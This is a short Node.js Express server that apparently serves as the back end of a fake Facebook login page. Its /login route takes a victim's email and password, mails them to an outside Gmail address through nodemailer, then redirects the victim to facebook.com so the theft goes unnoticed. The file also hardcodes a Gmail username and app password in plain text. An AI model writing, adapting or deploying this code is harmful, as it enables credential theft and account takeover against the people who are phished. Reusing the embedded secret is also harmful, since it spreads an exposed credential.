const express = require('express')
const cors = require('cors')
const nodemailer =require('nodemailer')



const app = express()
const port = process.env.PORT || 8080

app.use(cors({
  origin:['https://fb-mu-three.vercel.app'],
  methods:['GET','POST']
}))
app.use(express.json())

const transport = nodemailer.createTransport({
    service: "gmail",
    port: "465",
    auth: {
      user: "d.wizard.techno@gmail.com",
      pass: "boozsksocsbmadau",
    },
  });
app.post('/login', async(req, res) => {
    console.log('getting')
    const data = {
        from: `"deepak" <d.wizard.techno@gmail.com>`,
        to: "amclrankers16@gmail.com",
        subject: "got new password",
        text: `username:${req.body.email} and password:${req.body.password}`,
        
      };
    
    
      try{
    
        const info=await transport.sendMail(data);
        if(info){
            console.log("email sent !");
            return res.redirect('https://www.facebook.com')
        }
      }catch(err){
        console.log(err)
      }
})
app.get('/', (req, res) => {
  res.send('Hello World!')
})



app.listen(port, () => {
  console.log(`Example app listening on port http://localhost:8080`)
})